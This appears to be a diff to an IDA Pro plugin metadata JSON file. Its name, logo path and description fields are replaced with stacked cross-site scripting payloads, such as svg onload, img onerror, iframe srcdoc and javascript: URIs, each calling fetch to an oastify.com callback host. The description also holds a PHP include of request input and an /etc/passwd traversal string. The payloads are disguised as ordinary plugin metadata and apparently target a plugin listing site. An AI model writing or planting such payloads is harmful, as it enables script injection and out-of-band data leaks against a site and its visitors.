@@ -1,7 +1,7 @@
 {
   "IDAMetadataDescriptorVersion": 1,
   "plugin": {
-    "name": "</script><img src=x onerror=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/name')>",
+    "name": "\"><svg/onload=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/name')>",
     "entryPoint": "function_analyzer_plus.py",
     "categories": [
       "disassembly-and-processor-modules",
@@ -9,9 +9,8 @@
       "debugging-and-tracing"
     ],
     "logoPath": "javascript:fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/logo')",
-    "idaVersions": "^8.4.0",
-    "description": "<svg/onload=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/desc')>"
-    ,
+    "idaVersions": ">=8.4.0",
+    "description": "\"><svg/onload=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/xss')>//</script><iframe srcdoc='<script>fetch(`http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/srcdoc`)</script>'></iframe><img src=x onerror='new Image().src=\"http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/onerror\"'><?php include($_GET['page']); ?>../../../../etc/passwd\"><style>@import'javascript:fetch(\"http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/css")';</style><!--<script/src=//axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/payload.js>--><a href=\"javascript:fetch('//axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/click')\">ClickMe</a><body onload=fetch('http://axbm68lau2qjd0gamqqvzr5k9bf23xrm.oastify.com/onload')><meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss')\">",
     "version": "1.1.4"
   }
 }
